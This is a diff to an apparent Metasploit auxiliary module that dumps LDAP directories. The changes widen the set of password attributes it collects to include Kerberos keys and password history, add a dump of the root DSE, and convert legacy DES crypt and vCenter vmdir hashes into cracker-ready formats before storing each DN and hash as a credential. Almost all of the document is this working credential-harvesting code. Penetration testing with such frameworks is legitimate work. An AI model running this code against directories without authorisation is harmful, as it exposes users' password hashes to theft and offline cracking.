@@ -48,7 +48,8 @@ class MetasploitModule < Msf::Auxiliary
       OptString.new('USER_ATTR', [false, 'LDAP attribute(s), that contains username', 'dn']),
       OptString.new('PASS_ATTR', [
         true, 'LDAP attribute, that contains password hashes',
-        'userPassword, sambantpassword, sambalmpassword, unixUserPassword, password'
+        'userPassword, sambantpassword, sambalmpassword, unixUserPassword, password, passwordhistory, krbprincipalkey'
+        # ipanthash, krbpwdhistory, krbmkey, userpkcs12
       ])
     ])
   end
@@ -88,19 +89,44 @@ class MetasploitModule < Msf::Auxiliary
         end
       end
 
+      # Dump root DSE, there are useful information too, e.g. dir admin
+      print_status("#{peer} Dumping data for root DSE")
+      Tempfile.create do |f|
+        f.write("# LDIF dump of root DSE for #{peer}\n")
+        f.write("\n")
+        i = 0
+        ldap.search(base: '',
+                    ignore_server_caps: true,
+                    scope: Net::LDAP::SearchScope_BaseObject,
+                    attributes: %w[* + -]) do |entry|
+          f.write("# #{entry.dn}\n")
+          f.write(entry.to_ldif.force_encoding('utf-8'))
+          f.write("\n")
+          i += 1
+        end
+        if i > 0
+          f.rewind
+          pillage(f.read, 'DSE Root')
+        else
+          print_error("#{peer} No entries returned.")
+        end
+      end
+
       @user_attr ||= datastore['USER_ATTR']
       @user_attr ||= 'dn'
       print_status("Taking '#{@user_attr}' attribute as username")
 
       pass_attr ||= datastore['PASS_ATTR']
-      pass_attr_array = pass_attr.split(/[,\s]+/).compact.reject(&:empty?)
+      pass_attr_array = pass_attr.split(/[,\s]+/).compact.reject(&:empty?).map(&:downcase)
 
       naming_contexts.each do |base_dn|
         print_status("#{peer} Dumping data for base DN='#{base_dn}'")
         Tempfile.create do |f|
           f.write("# LDIF dump of #{peer}, base DN='#{base_dn}'\n")
           f.write("\n")
-          ldap.search(base: base_dn, attributes: %w[* + -]) do |entry|
+          i = 0
+          ldap.search(base: base_dn,
+                      attributes: %w[* + -]) do |entry|
             base_dn_vuln = base_dn
             f.write("# #{entry.dn}\n")
             f.write(entry.to_ldif.force_encoding('utf-8'))
@@ -110,9 +136,14 @@ class MetasploitModule < Msf::Auxiliary
                 process_hash(entry, attr)
               end
             end
+            i += 1
           end
-          f.rewind
-          pillage(f.read, base_dn)
+          if i > 0
+            f.rewind
+            pillage(f.read, base_dn)
+          else
+            print_error("#{peer} No entries returned.")
+          end
         end
       end
     end
@@ -171,27 +202,37 @@ class MetasploitModule < Msf::Auxiliary
     if hash.nil? || hash.empty? ||
        (hash.start_with?(/{crypt}/i) && hash.length < 10) ||
        hash.start_with?('*****') ||
-       hash.start_with?(/xxxxx/i)
+       hash.start_with?(/xxxxx/i) ||
+       (pass_attr_name =~ /^samba(lm|nt)password$/ && (hash.length != 32))
       return
     end
 
-    # Remove ldap {crypt} prefix from known hash types
-    hash.gsub!(/{crypt}\$1\$/i, '$1$')
-    hash.gsub!(/{crypt}\$6\$/i, '$6$')
-
-    # TODO: handle {crypt}taditional_crypt case, i.e. expliitly set the hash format
-    # TODO: handle vcenter vmdir binary hash format
-
-    case pass_attr_name.downcase
+    case pass_attr_name
     when 'sambalmpassword'
       hash_format = 'lm'
     when 'sambantpassword'
       hash_format = 'nt'
     else
-      hash_format = identify_hash(hash)
+      if hash.start_with?(/{crypt}/i) && hash.length == 20
+        # handle {crypt}traditional_crypt case, i.e. explicitly set the hash format
+        hash.slice!(/{crypt}/i)
+        hash_format = 'descrypt' # FIXME: what is the right jtr_hash - des,crypt or descrypt ?
+      # identify_hash returns des,crypt, but JtR acceppts descrypt
+      else
+        # handle vcenter vmdir binary hash format
+        if hash[0].ord == 1 && hash.length == 81
+          _type, hash, salt = hash.unpack('CH128H32')
+          hash = "$dynamic_82$#{hash}$HEX$#{salt}"
+        else
+          # Remove ldap {crypt} prefix from known hash types
+          hash.gsub!(/{crypt}!?\$1\$/i, '$1$')
+          hash.gsub!(/{crypt}!?\$6\$/i, '$6$')
+        end
+        hash_format = identify_hash(hash)
+      end
     end
 
-    print_good("Credentials (#{hash_format}) found: #{dn}:#{hash}")
+    print_good("#{peer} Credentials (#{hash_format}) found: #{dn}:#{hash}")
 
     create_credential(service_details.merge(
       username: dn,
